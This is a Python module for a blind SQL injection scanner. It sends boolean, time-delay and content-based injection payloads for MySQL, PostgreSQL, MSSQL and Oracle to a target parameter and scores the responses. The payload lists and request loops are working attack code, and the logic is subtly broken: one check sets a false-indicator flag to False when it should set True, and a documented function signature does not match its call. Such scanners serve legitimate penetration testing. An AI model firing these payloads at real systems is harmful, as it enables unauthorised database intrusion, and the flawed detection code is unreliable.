"""
Blind SQL injection detection (when no errors are shown).
"""
import time
import hashlib
from typing import List, Dict, Tuple, Optional, Callable
from dataclasses import dataclass
import logging
import string
import random

logger = logging.getLogger(__name__)

@dataclass
class BlindTestResult:
    """Results from blind SQLi testing"""
    parameter: str
    technique: str  # 'boolean', 'time', 'content'
    is_vulnerable: bool
    confidence: float
    evidence: Dict
    inferred_condition: Optional[str] = None

class BlindSQLiDetector:
    """Blind SQL injection detector"""
    
    def __init__(self, request_func: Callable = None):
        """
        Initialize blind SQLi detector.
        
        Args:
            request_func: Function to make HTTP requests
                         Should accept (url, params, data) and return response text
        """
        self.request_func = request_func
        self.time_threshold = 2.0  # Seconds for time-based detection
        
        # Blind SQLi payloads
        self.blind_payloads = {
            'boolean': [
                # MySQL
                ("' AND '1'='1", "' AND '1'='2", "mysql"),
                ("' AND 1=1", "' AND 1=2", "mysql"),
                ("' OR IF(1=1,1,0)", "' OR IF(1=2,1,0)", "mysql"),
                
                # PostgreSQL
                ("' AND 1=1--", "' AND 1=2--", "postgresql"),
                ("' AND '1'='1'--", "' AND '1'='2'--", "postgresql"),
                
                # MSSQL
                ("' AND 1=1--", "' AND 1=2--", "mssql"),
                
                # Oracle
                ("' AND 1=1--", "' AND 1=2--", "oracle"),
            ],
            'time': [
                # MySQL
                ("' AND SLEEP({})--", "mysql"),
                ("' OR SLEEP({})--", "mysql"),
                ("'; SELECT SLEEP({})--", "mysql"),
                
                # PostgreSQL
                ("' AND pg_sleep({})--", "postgresql"),
                ("'; SELECT pg_sleep({})--", "postgresql"),
                
                # MSSQL
                ("' WAITFOR DELAY '00:00:{:02d}'--", "mssql"),
                ("'; WAITFOR DELAY '00:00:{:02d}'--", "mssql"),
                
                # Oracle
                ("' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),{})--", "oracle"),
                ("'; DBMS_LOCK.SLEEP({})--", "oracle"),
            ],
        }
        
        # Content-based detection patterns
        self.content_patterns = {
            'true_indicators': [
                "welcome", "success", "found", "exists", "valid",
                "logged in", "authorized", "match", "correct"
            ],
            'false_indicators': [
                "error", "invalid", "not found", "failed", "denied",
                "incorrect", "wrong", "no results", "empty"
            ],
        }
    
    def detect_blind_boolean(self, url: str, param: str, 
                            get_params: Dict, post_data: Dict,
                            method: str = 'GET') -> List[BlindTestResult]:
        """
        Detect blind boolean-based SQL injection.
        
        Args:
            url: Target URL
            param: Parameter to test
            get_params: GET parameters
            post_data: POST data
            method: HTTP method
            
        Returns:
            List of BlindTestResult objects
        """
        results = []
        
        # Get baseline response
        baseline_response = self._make_request(url, param, "", 
                                              method, get_params, post_data)
        
        if not baseline_response:
            return results
        
        baseline_hash = self._hash_response(baseline_response)
        
        logger.info(f"Testing blind boolean SQLi on {param}")
        
        # Test each payload pair
        for true_payload, false_payload, db_type in self.blind_payloads['boolean']:
            try:
                # Send true condition request
                true_response = self._make_request(
                    url, param, true_payload, method, get_params, post_data
                )
                
                if not true_response:
                    continue
                
                # Send false condition request
                false_response = self._make_request(
                    url, param, false_payload, method, get_params, post_data
                )
                
                if not false_response:
                    continue
                
                # Analyze responses
                is_vulnerable, confidence, evidence = self._analyze_blind_responses(
                    true_response, false_response, baseline_response,
                    true_payload, false_payload
                )
                
                if is_vulnerable:
                    result = BlindTestResult(
                        parameter=param,
                        technique='boolean',
                        is_vulnerable=True,
                        confidence=confidence,
                        evidence=evidence,
                        inferred_condition=f"IF({true_payload}) != IF({false_payload})"
                    )
                    results.append(result)
                    
                    logger.info(f"✅ Potential blind boolean SQLi in {param}")
                    logger.info(f"   Confidence: {confidence:.2f}")
                    logger.info(f"   DB Type: {db_type}")
                
            except Exception as e:
                logger.error(f"Error testing blind boolean: {e}")
                continue
        
        return results
    
    def detect_blind_time(self, url: str, param: str,
                         get_params: Dict, post_data: Dict,
                         method: str = 'GET', 
                         sleep_time: int = 5) -> List[BlindTestResult]:
        """
        Detect blind time-based SQL injection.
        
        Args:
            url: Target URL
            param: Parameter to test
            get_params: GET parameters
            post_data: POST data
            method: HTTP method
            sleep_time: Sleep time in seconds for payloads
            
        Returns:
            List of BlindTestResult objects
        """
        results = []
        
        logger.info(f"Testing blind time-based SQLi on {param}")
        
        # Test each time-based payload
        for payload_template, db_type in self.blind_payloads['time']:
            try:
                # Format payload with sleep time
                if "{}" in payload_template:
                    payload = payload_template.format(sleep_time)
                elif "{:02d}" in payload_template:
                    payload = payload_template.format(sleep_time)
                else:
                    payload = payload_template
                
                # Measure response time
                start_time = time.time()
                
                response = self._make_request(
                    url, param, payload, method, get_params, post_data
                )
                
                elapsed = time.time() - start_time
                
                if response and elapsed >= sleep_time - 1:  # Account for network
                    # Send confirmation with different time
                    confirm_time = sleep_time * 2
                    
                    if "{}" in payload_template:
                        confirm_payload = payload_template.format(confirm_time)
                    elif "{:02d}" in payload_template:
                        confirm_payload = payload_template.format(confirm_time)
                    else:
                        confirm_payload = payload_template
                    
                    start_time2 = time.time()
                    response2 = self._make_request(
                        url, param, confirm_payload, method, get_params, post_data
                    )
                    elapsed2 = time.time() - start_time2
                    
                    # Check if second request took roughly twice as long
                    if (elapsed2 >= (sleep_time * 2) - 2 and 
                        abs(elapsed2 - (elapsed * 2)) < 3):
                        
                        confidence = min(0.7 + (elapsed - sleep_time) / 10, 0.95)
                        
                        result = BlindTestResult(
                            parameter=param,
                            technique='time',
                            is_vulnerable=True,
                            confidence=confidence,
                            evidence={
                                'first_request_time': elapsed,
                                'second_request_time': elapsed2,
                                'sleep_time': sleep_time,
                                'database_type': db_type
                            },
                            inferred_condition=f"SLEEP({sleep_time}) successful"
                        )
                        results.append(result)
                        
                        logger.info(f"✅ Potential blind time-based SQLi in {param}")
                        logger.info(f"   Response time: {elapsed:.1f}s")
                        logger.info(f"   Confidence: {confidence:.2f}")
                        logger.info(f"   DB Type: {db_type}")
                
            except Exception as e:
                logger.error(f"Error testing blind time: {e}")
                continue
        
        return results
    
    def detect_blind_content(self, url: str, param: str,
                           get_params: Dict, post_data: Dict,
                           method: str = 'GET') -> List[BlindTestResult]:
        """
        Detect blind SQLi through content analysis.
        
        Args:
            url: Target URL
            param: Parameter to test
            get_params: GET parameters
            post_data: POST data
            method: HTTP method
            
        Returns:
            List of BlindTestResult objects
        """
        results = []
        
        # Get baseline response
        baseline_response = self._make_request(url, param, "", 
                                              method, get_params, post_data)
        
        if not baseline_response:
            return results
        
        baseline_lower = baseline_response.lower()
        
        logger.info(f"Testing blind content-based SQLi on {param}")
        
        # Test with payloads that might affect content
        test_payloads = [
            ("' OR '1'='1", "true_condition"),
            ("' AND '1'='2", "false_condition"),
            ("' OR username LIKE '%admin%'", "admin_search"),
            ("' OR 1=1--", "always_true"),
            ("' AND 1=2--", "always_false"),
        ]
        
        for payload, payload_type in test_payloads:
            try:
                response = self._make_request(
                    url, param, payload, method, get_params, post_data
                )
                
                if not response:
                    continue
                
                response_lower = response.lower()
                
                # Analyze content changes
                is_vulnerable, confidence, evidence = self._analyze_content_changes(
                    response_lower, baseline_lower, payload_type
                )
                
                if is_vulnerable:
                    result = BlindTestResult(
                        parameter=param,
                        technique='content',
                        is_vulnerable=True,
                        confidence=confidence,
                        evidence=evidence,
                        inferred_condition=f"Content changed with {payload_type}"
                    )
                    results.append(result)
                    
                    logger.info(f"✅ Potential blind content-based SQLi in {param}")
                    logger.info(f"   Confidence: {confidence:.2f}")
                    logger.info(f"   Payload type: {payload_type}")
                
            except Exception as e:
                logger.error(f"Error testing blind content: {e}")
                continue
        
        return results
    
    def _analyze_blind_responses(self, true_response: str, false_response: str,
                                baseline_response: str, true_payload: str,
                                false_payload: str) -> Tuple[bool, float, Dict]:
        """Analyze responses for blind boolean SQLi."""
        evidence = {
            'true_response_hash': self._hash_response(true_response),
            'false_response_hash': self._hash_response(false_response),
            'baseline_hash': self._hash_response(baseline_response),
            'true_false_different': False,
            'true_baseline_different': False,
            'false_baseline_different': False,
            'content_analysis': {},
        }
        
        # Check if true and false responses are different
        if true_response != false_response:
            evidence['true_false_different'] = True
            
            # Calculate similarity
            similarity = self._calculate_similarity(true_response, false_response)
            evidence['content_analysis']['true_false_similarity'] = similarity
        
        # Check if responses differ from baseline
        if true_response != baseline_response:
            evidence['true_baseline_different'] = True
            similarity = self._calculate_similarity(true_response, baseline_response)
            evidence['content_analysis']['true_baseline_similarity'] = similarity
        
        if false_response != baseline_response:
            evidence['false_baseline_different'] = True
            similarity = self._calculate_similarity(false_response, baseline_response)
            evidence['content_analysis']['false_baseline_similarity'] = similarity
        
        # Determine vulnerability
        is_vulnerable = False
        confidence = 0.0
        
        # Strong indicator: Different responses for true/false
        if evidence['true_false_different']:
            is_vulnerable = True
            confidence = 0.7
            
            # If both differ from baseline, increase confidence
            if evidence['true_baseline_different'] and evidence['false_baseline_different']:
                confidence = min(confidence + 0.2, 0.9)
        
        # Moderate indicator: Only one differs from baseline
        elif (evidence['true_baseline_different'] and not evidence['false_baseline_different'] or
              evidence['false_baseline_different'] and not evidence['true_baseline_different']):
            is_vulnerable = True
            confidence = 0.5
        
        # Check for content patterns
        content_analysis = self._analyze_content_patterns(
            true_response, false_response, baseline_response
        )
        evidence['content_analysis'].update(content_analysis)
        
        # Adjust confidence based on content patterns
        if content_analysis.get('has_true_indicators', False):
            confidence = min(confidence + 0.1, 0.95)
        if content_analysis.get('has_false_indicators', False):
            confidence = min(confidence + 0.1, 0.95)
        
        return is_vulnerable, confidence, evidence
    
    def _analyze_content_changes(self, response: str, baseline: str,
                                payload_type: str) -> Tuple[bool, float, Dict]:
        """Analyze content changes for blind SQLi."""
        evidence = {
            'response_length': len(response),
            'baseline_length': len(baseline),
            'length_difference': len(response) - len(baseline),
            'has_true_indicators': False,
            'has_false_indicators': False,
            'significant_change': False,
        }
        
        # Check for significant length change (> 10%)
        if len(baseline) > 0:
            length_diff_percent = abs(evidence['length_difference']) / len(baseline)
            evidence['significant_change'] = length_diff_percent > 0.1
        
        # Check for true/false indicators
        for indicator in self.content_patterns['true_indicators']:
            if indicator in response and indicator not in baseline:
                evidence['has_true_indicators'] = True
                break
        
        for indicator in self.content_patterns['false_indicators']:
            if indicator in response and indicator not in baseline:
                evidence['has_false_indicators'] = False
                break
        
        # Determine vulnerability
        is_vulnerable = False
        confidence = 0.0
        
        # Check based on payload type
        if payload_type == 'true_condition' and evidence['has_true_indicators']:
            is_vulnerable = True
            confidence = 0.6
        elif payload_type == 'false_condition' and evidence['has_false_indicators']:
            is_vulnerable = True
            confidence = 0.6
        elif evidence['significant_change']:
            is_vulnerable = True
            confidence = 0.5
        
        # Adjust confidence based on multiple factors
        if is_vulnerable:
            if evidence['significant_change']:
                confidence = min(confidence + 0.2, 0.9)
            if evidence['has_true_indicators'] or evidence['has_false_indicators']:
                confidence = min(confidence + 0.1, 0.95)
        
        return is_vulnerable, confidence, evidence
    
    def _analyze_content_patterns(self, true_response: str, false_response: str,
                                 baseline_response: str) -> Dict:
        """Analyze content patterns in responses."""
        analysis = {
            'has_true_indicators': False,
            'has_false_indicators': False,
            'true_indicators_found': [],
            'false_indicators_found': [],
        }
        
        # Check true response for positive indicators
        for indicator in self.content_patterns['true_indicators']:
            if (indicator in true_response.lower() and 
                indicator not in baseline_response.lower()):
                analysis['has_true_indicators'] = True
                analysis['true_indicators_found'].append(indicator)
        
        # Check false response for negative indicators
        for indicator in self.content_patterns['false_indicators']:
            if (indicator in false_response.lower() and 
                indicator not in baseline_response.lower()):
                analysis['has_false_indicators'] = True
                analysis['false_indicators_found'].append(indicator)
        
        return analysis
    
    def _hash_response(self, response: str) -> str:
        """Create hash of response for comparison."""
        return hashlib.md5(response.encode('utf-8')).hexdigest()
    
    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """Calculate similarity between two texts."""
        if not text1 or not text2:
            return 0.0
        
        # Simple similarity based on common words
        words1 = set(text1.lower().split())
        words2 = set(text2.lower().split())
        
        if not words1 or not words2:
            return 0.0
        
        common = words1.intersection(words2)
        return len(common) / max(len(words1), len(words2))
    
    def _make_request(self, url: str, param: str, payload: str,
                     method: str, get_params: Dict, post_data: Dict) -> Optional[str]:
        """
        Make HTTP request with payload.
        
        This is a placeholder - in production, use actual HTTP client.
        """
        if self.request_func:
            return self.request_func(url, param, payload, method, get_params, post_data)
        
        # Mock implementation for testing
        logger.debug(f"Mock request: {param}={payload}")
        return f"Mock response for {payload}"

# Test function
def test_blind_detector():
    """Test the blind SQLi detector"""
    detector = BlindSQLiDetector()
    
    print("Blind SQLi detector test:")
    
    # Test response hashing
    test_text = "Hello World"
    hash_result = detector._hash_response(test_text)
    print(f"✓ Response hash: {hash_result[:16]}...")
    
    # Test similarity calculation
    text1 = "Hello world this is a test"
    text2 = "Hello world this is another test"
    similarity = detector._calculate_similarity(text1, text2)
    print(f"✓ Text similarity: {similarity:.2f}")
    
    # Test content pattern analysis
    true_response = "Welcome user! Login successful."
    false_response = "Error: Invalid credentials."
    baseline = "Please login to continue."
    
    analysis = detector._analyze_content_patterns(
        true_response, false_response, baseline
    )
    print(f"✓ Content analysis:")
    print(f"  Has true indicators: {analysis['has_true_indicators']}")
    print(f"  Has false indicators: {analysis['has_false_indicators']}")
    
    return detector

if __name__ == "__main__":
    test_blind_detector()